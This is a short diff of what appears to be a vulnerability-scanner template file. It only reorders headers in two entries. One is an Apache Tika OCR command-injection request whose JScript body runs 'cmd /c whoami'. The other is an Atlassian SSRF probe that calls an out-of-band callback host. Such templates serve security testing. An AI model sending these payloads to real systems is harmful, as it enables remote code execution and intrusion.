@@ -6679,11 +6679,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
+            "X-Tika-OCRTesseractPath": "cscript",
+            "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
             "Content-type": "image/jp2",
-            "Connection": "close",
-            "X-Tika-OCRTesseractPath": "cscript",
-            "X-Tika-OCRLanguage": "//E:Jscript"
+            "Connection": "close"
           },
           "method": "PUT",
           "path": [
@@ -10182,8 +10182,8 @@
         {
           "body": "url=https://{{Host}}:443@{{interactsh-url}}\n",
           "headers": {
-            "X-Atlassian-Token": "no-check",
-            "Content-Type": "application/x-www-form-urlencoded"
+            "Content-Type": "application/x-www-form-urlencoded",
+            "X-Atlassian-Token": "no-check"
           },
           "method": "POST",
           "path": [
